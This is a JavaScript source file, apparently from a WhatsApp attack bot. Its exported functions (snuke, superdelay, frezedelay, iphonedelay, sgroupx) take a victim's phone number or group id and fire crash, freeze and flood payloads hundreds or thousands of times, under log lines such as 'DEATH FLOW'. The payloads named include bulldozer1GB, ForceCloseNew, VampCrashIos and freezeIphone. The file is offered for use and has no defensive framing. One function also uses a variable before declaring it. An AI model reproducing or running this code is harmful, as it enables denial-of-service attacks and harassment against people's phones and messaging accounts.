    await RInvisIphone(sock, jid);
    await IpLocation(sock, jid);
    await TxIos(sock, jid);
    await RansCrashIos(sock, jid);
    await RansSupIos(sock, jid);
    await nolosios(sock, jid);
    await RInvisIphone(sock, jid);
    await IpLocation(sock, jid);
    await TxIos(sock, jid);
    await RansCrashIos(sock, jid);
    await RansSupIos(sock, jid);
    await nolosios(sock, jid);
    await RInvisIphone(sock, jid);
    await IpLocation(sock, jid);
    await TxIos(sock, jid);
    await RansCrashIos(sock, jid);
    await RansSupIos(sock, jid);
  }
}

export async function snuke(sock, number) {
const formattedNumber = number.replace(/[^0-9]/g, "");
const jid = `${formattedNumber}@s.whatsapp.net`;
  
  if (!sock.user) throw new Error("Bot tidak aktif.");
  console.log(chalk.green(`STARTING DEATH FLOW to ${jid}`));
  
  for (let i = 1; i <= 2; i++) {
    if (!sock.user) break;
    console.log(chalk.red(`DEATH FLOW to ${jid}`));
    await safeExec("bulldozer1GB", () => bulldozer1GB(sock, jid));
    await safeExec("bulldozer1GB", () => bulldozer1GB(sock, jid));
    await safeExec("bulldozer1GB", () => bulldozer1GB(sock, jid));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await delay(400);
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await xproto(sock, 24, jid);
    await delay(400);
    await xproto(sock, 24, jid);
    await xproto(sock, 24, jid);
    await delay(400);
    await safeExec("ZeroRadiactive", () => ZeroRadiactive(sock, jid, true));
    await safeExec("ZeroRadiactive", () => ZeroRadiactive(sock, jid, true));
    await safeExec("ZeroRadiactive", () => ZeroRadiactive(sock, jid, true));
    await delay(400);
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid));
    await delay(2000);
    await safeExec("CursorCrL", () => CursorCrL(sock, jid));
    await safeExec("CursorCrL", () => CursorCrL(sock, jid));
    await safeExec("CursorCrL", () => CursorCrL(sock, jid));
    await safeExec("CursorCrL", () => CursorCrL(sock, jid));
    await delay(2000);
    await safeExec("CursorpCrLX", () => CursorpCrLX(sock, jid));
    await safeExec("CursorpCrLX", () => CursorpCrLX(sock, jid));
    await safeExec("CursorpCrLX", () => CursorpCrLX(sock, jid));
    await safeExec("CursorpCrLX", () => CursorpCrLX(sock, jid));
    await safeExec("ForceCloseNew", () => ForceCloseNew(sock, jid));
    await delay(500);
    await safeExec("ForceCloseNew", () => ForceCloseNew(sock, jid));
    await safeExec("ForceCloseNew", () => ForceCloseNew(sock, jid));
    await safeExec("ForceCloseNew", () => ForceCloseNew(sock, jid));
    await safeExec("ForceCloseNew", () => ForceCloseNew(sock, jid));
    await delay(2000);
    await safeExec("uisystemBug", () => uisystemBug(sock, jid));
    await safeExec("uisystemBug", () => uisystemBug(sock, jid));
    await safeExec("uisystemBug", () => uisystemBug(sock, jid));
    await safeExec("uisystemBug", () => uisystemBug(sock, jid));
    await safeExec("uisystemBug", () => uisystemBug(sock, jid));
  }
  console.log(`Selesai superbulldozer ke ${jid} oleh ${sock.user.id}`);
}

export async function superdelay(sock, number) {
const formattedNumber = number.replace(/[^0-9]/g, "");
const jid = `${formattedNumber}@s.whatsapp.net`;
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING superdelay ${jid}`));

  for (let i = 1; i <= 1000; i++) {
    if (!sock.user) break;

    console.log(chalk.red(`superdelay superdelay to ${jid}`));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid));
    await delay(400);
    await safeExec("protocol8T", () => protocol8T(sock, jid, true));
    await safeExec("protocol8T", () => protocol8T(sock, jid, true));
    await safeExec("protocol8T", () => protocol8T(sock, jid, true));
    await safeExec("ChronosDelay",() => ChronosDelay(sock, jid, true));
    await safeExec("ChronosDelay",() => ChronosDelay(sock, jid, true));
    await safeExec("ChronosDelay",() => ChronosDelay(sock, jid, true));
    await delay(400);
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await delay(2000);
  }

  console.log(`FINISH superdelay to ${jid} oleh ${sock.user.id}`);
}

export async function frezedelay(sock, number) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING DEATH FLOW ${jid}`));
const formattedNumber = number.replace(/[^0-9]/g, "");
const jid = `${formattedNumber}@s.whatsapp.net`;
  for (let i = 1; i <= 1000; i++) {
    if (!sock.user) break;

    console.log(chalk.red(`DEATH FLOW to ${jid}`));

    await safeExec("blankChat", () => blankChat(sock, jid));
    await safeExec("blankChat", () => blankChat(sock, jid));
    await safeExec("blankChat", () => blankChat(sock, jid));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await delay(400);
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("ChronosDelay", () => ChronosDelay(sock, jid, true)); 
    await safeExec("ChronosDelay", () => ChronosDelay(sock, jid, true)); 
    await safeExec("ChronosDelay", () => ChronosDelay(sock, jid, true));
    await delay(400);
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await delay(400);
    await safeExec("spay", () => spay(sock, jid)); 
    await safeExec("spay", () => spay(sock, jid)); 
    await safeExec("spay", () => spay(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await delay(3000);
  }

  console.log(`Selesai frezedelay ke ${jid} oleh ${sock.user.id}`);
}

export async function iphonedelay(sock, number) {
const formattedNumber = number.replace(/[^0-9]/g, "");
const jid = `${formattedNumber}@s.whatsapp.net`;
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING iphonedelay to ${jid}`));

  for (let i = 1; i <= 3000; i++) {
    if (!sock.user) break;

    console.log(chalk.red(`Sending sgroupx to ${jid}`));
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await delay(400);
    await safeExec("ComboIos", () => ComboIos(sock, jid));
    await safeExec("ComboIos", () => ComboIos(sock, jid));
    await safeExec("VampiPhone", () => VampiPhone(sock, jid));
    await safeExec("VampiPhone", () => VampiPhone(sock, jid));
    await safeExec("VampiPhone", () => VampiPhone(sock, jid));
    await delay(400);
    await safeExec("VampDelayMess", () => VampDelayMess(sock, jid));
    await safeExec("VampDelayMess", () => VampDelayMess(sock, jid));
    await safeExec("VampDelayMess", () => VampDelayMess(sock, jid));
    await delay(400);
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await delay(2000);
  }

  console.log(`Selesai sgroupx ke ${jid} oleh ${sock.user.id}`);
}

export async function sgroupx(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING sgroupx to ${jid}`));

  for (let i = 1; i <= 1000; i++) {
    if (!sock.user) break;

    console.log(chalk.red(`Sending sgroupx to ${jid}`));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await carouselNew(jid);
    await carouselNew(jid);
    await carouselNew(jid);
    await delay(400);
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await delay(400);
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await delay(400);
    await carouselNew(jid);
    await carouselNew(jid);
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await delay(2000);
    await carouselNew(jid);
    await carouselNew(jid);
  }

  console.log(`Selesai sgroupx ke ${jid} oleh ${sock.user.id}`);
}